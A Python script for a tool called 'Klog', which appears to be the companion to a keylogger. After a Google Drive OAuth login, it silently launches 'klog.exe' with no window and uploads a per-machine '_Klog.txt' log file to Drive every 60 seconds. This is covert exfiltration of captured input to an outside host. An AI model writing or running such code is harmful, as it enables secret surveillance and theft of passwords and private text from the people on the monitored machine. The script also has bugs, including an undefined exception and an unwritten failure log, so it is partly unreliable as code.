from __future__ import print_function
import pickle
import os.path
import os
import io
import shutil
import requests
from mimetypes import MimeTypes
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient.http import MediaIoBaseDownload, MediaFileUpload
from tkinter import *
from datetime import datetime
import time
import subprocess
cd = os.getcwd()
sysname = os.environ['COMPUTERNAME']
global tokenexists
if os.path.exists('token.pickle'):
    tokenexists = True
    StartButtonState = 'normal'
    LoginOrLogoutText = 'Logout'
      
else:
    tokenexists = False
    StartButtonState = 'disabled'
    LoginOrLogoutText = "Login"
class DriveAPI:
    global SCOPES
      
    SCOPES = ['https://www.googleapis.com/auth/drive.file']
  
    def __init__(self):
        self.creds = None

        if os.path.exists('token.pickle'):
            with open('token.pickle', 'rb') as token:
                self.creds = pickle.load(token)

        if not self.creds or not self.creds.valid:
  
            if self.creds and self.creds.expired and self.creds.refresh_token:
                self.creds.refresh(Request())
            else:

                flow = InstalledAppFlow.from_client_secrets_file(
                    'credentials.json', SCOPES)
                self.creds = flow.run_local_server(port=8081,authorization_prompt_message='Please visit this URL: {url}', 
      success_message='You Have Succesfully logged in to Klog. You can now close the window.',
      open_browser=True)

            with open('token.pickle', 'wb') as token:
                pickle.dump(self.creds, token)
        self.service = build('drive', 'v3', credentials=self.creds)
        results = self.service.files().list(
            pageSize=100, fields="files(id, name)").execute()
        items = results.get('files', [])


    def FileUpload(self, filepath):
        
        
        name = filepath.split('/')[-1]

        mimetype = MimeTypes().guess_type(name)[0]

        file_metadata = {'name': name}
  
        try:
            media = MediaFileUpload(filepath, mimetype=mimetype)
            file = self.service.files().create(
                body=file_metadata, media_body=media, fields='id').execute()
            with open('log.txt','a') as f:
                towrite= str(datetime.now()) + "  :  Klog Succesfully Uploaded" + "\n"
                f.write(towrite)
          
        except:
            with open('log.txt','a') as f:
                towrite = str(datetime.now()) + "  :  Failed Upload" + "\n"
            raise UploadError("Can't Upload File.Try Deleting token.pickle and restarting app")
  
   
if __name__ == "__main__":
    def start():
        window.destroy()
    def LoginOrLogoutCommand():
        if tokenexists:
            os.remove(cd + "\\token.pickle")
            LoginOrLogout.configure(text = 'Login')

            
        else:
            obj = DriveAPI()
            LoginOrLogout.configure(text = 'Logout')

    window = Tk()
    window.geometry("300x200")
    window.title('Klog')
    head = Label(window,text='Klog')
    head.grid(row=0,column=1,pady=50,padx=50)
    start = Button(window,text="Start",command=start,state=StartButtonState)
    start.grid(row=1,column=1,pady=5,padx=50)
    LoginOrLogout = Button(window,text=LoginOrLogoutText,command = LoginOrLogoutCommand)
    LoginOrLogout.grid(row = 1,column = 0,pady = 50, padx=50)
    window.mainloop()
    subprocess.Popen(cd+'//klog.exe',creationflags=(subprocess.CREATE_NO_WINDOW))
    obj = DriveAPI()
    while True:
        time.sleep(60)
        obj.FileUpload(cd +"\\"+sysname+"_Klog.txt")



    
